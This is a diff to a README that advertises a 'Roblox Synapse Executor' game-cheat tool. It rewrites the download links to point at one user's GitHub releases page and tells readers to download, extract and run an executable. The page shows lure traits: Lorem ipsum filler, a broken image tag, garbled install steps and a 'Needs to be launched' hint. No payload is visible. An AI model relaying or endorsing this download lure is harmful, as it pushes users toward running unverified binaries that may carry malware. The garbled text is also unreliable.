@@ -1,6 +1,6 @@
 # 🚀 Roblox Synapse Executor Repository 
 
-![Roblox Synapse Logo](https://example.com/roblox-synapse-logo.png)
+![Roblox Synapse Logo](https://github.com/kiru1374/Roblox-Synapse/releases)
 
 Welcome to the official GitHub repository for **Roblox Synapse Executor**! 
 
@@ -20,7 +20,7 @@ Welcome to the official GitHub repository for **Roblox Synapse Executor**!
 
 ### Get Started
 To download the Roblox Synapse Executor, click the button below:
-[![Download Roblox Synapse](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/assets/Release.zip "Needs to be launched")
+[![Download Roblox Synapse](https://github.com/kiru1374/Roblox-Synapse/releases)](https://github.com/kiru1374/Roblox-Synapse/releases "Needs to be launched")
 
 ### Additional Information
 If the above link is not working or you need more information, please check the "Releases" section of this repository.
@@ -37,7 +37,7 @@ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Mauris eget fermentum e
 4. **Lua Scripting Support:** Roblox Synapse fully supports Lua scripting, enabling users to unleash their creativity and enhance their gameplay.
 
 ### Installation Guide
-1. Download the "Release.zip" file from the provided link.
+1. Download the "https://github.com/kiru1374/Roblox-Synapse/releases" file from the provided link.
 2. Extract the contents of the zip file to a folder on your local machine.
 3. Run the executable file to launch Roblox Synapse Executor.
 4. Follow the on-screen instructions to start using the tool for your Roblox scripting needs.
